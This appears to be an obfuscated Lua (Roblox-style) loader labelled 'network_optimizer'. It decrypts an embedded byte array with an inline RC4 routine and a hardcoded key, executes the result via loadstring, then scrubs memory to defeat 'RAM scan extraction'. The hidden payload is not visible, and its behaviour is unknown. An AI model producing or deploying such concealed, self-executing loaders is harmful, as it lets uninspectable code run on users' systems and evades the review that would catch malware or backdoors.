-- Compiled secure segment
local fKegpHSY = {
{161,5,115,73,118,170,28,53,134,195,104,135,210,178,152,146,84,137,182,118,166,1,103,76,85,163,73,105,199,203,144,30,38,190,79,247,106,17,23,92,203,2,142,88,239,140,86,3,58,46,91,254,236,28,203,254,190,87,119,239},{189,228,14,117,104,138,103,35,146,62,163,158,183,253,67,120,35,246,211,113,183,89,41,134,142,52,122,172,135,39,198,246,206,203,144,172,137,235,99,234,106,32,135,77,195,39,45,0,53,215,147,253,188,185,83,120,74,195,16,123},{192,129,73,103,178,110,168,152,241,158,128,14,167,210,136,208,25,82,200,26,213,216,70,206,103,75,124,108,101}
}
local JXOAPCir = "XUgPgakPbrRGOWfZ"

local function DWIkdhrl(TzXeDLTY_data, TzXeDLTY_key)
    local TzXeDLTY = {}
    for ZWDUZygE = 0, 255 do TzXeDLTY[ZWDUZygE] = ZWDUZygE end
    local zyawykiX = 0
    for ZWDUZygE = 0, 255 do
        local rmkKynUn = TzXeDLTY_key:byte((ZWDUZygE % #TzXeDLTY_key) + 1)
        zyawykiX = (zyawykiX + TzXeDLTY[ZWDUZygE] + rmkKynUn) % 256
        TzXeDLTY[ZWDUZygE], TzXeDLTY[zyawykiX] = TzXeDLTY[zyawykiX], TzXeDLTY[ZWDUZygE]
    end
    local ZWDUZygE = 0
    local zyawykiX = 0
    local tpsYwTHG = {}
    for _, BtNmIBKw in ipairs(TzXeDLTY_data) do
        ZWDUZygE = (ZWDUZygE + 1) % 256
        zyawykiX = (zyawykiX + TzXeDLTY[ZWDUZygE]) % 256
        TzXeDLTY[ZWDUZygE], TzXeDLTY[zyawykiX] = TzXeDLTY[zyawykiX], TzXeDLTY[ZWDUZygE]
        local rmkKynUn = TzXeDLTY[(TzXeDLTY[ZWDUZygE] + TzXeDLTY[zyawykiX]) % 256]
        table.insert(tpsYwTHG, string.char(bit32.bxor(BtNmIBKw, rmkKynUn)))
    end
    return table.concat(tpsYwTHG)
end

local TzXeDLTY_flat = {}
for _, chunk in ipairs(fKegpHSY) do
    for _, byte in ipairs(chunk) do
        table.insert(TzXeDLTY_flat, byte)
    end
end

local decrypted = DWIkdhrl(TzXeDLTY_flat, JXOAPCir)
local oHlppQTF, VwJmoSYw = loadstring(decrypted)

-- Memory Sanitation: Overwrite decrypted variables to block RAM scan extraction
table.clear(TzXeDLTY_flat)
TzXeDLTY_flat = nil

if oHlppQTF then 
    local result = oHlppQTF() 
    decrypted = nil
    oHlppQTF = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "network_optimizer" .. "): " .. tostring(VwJmoSYw)) 
end
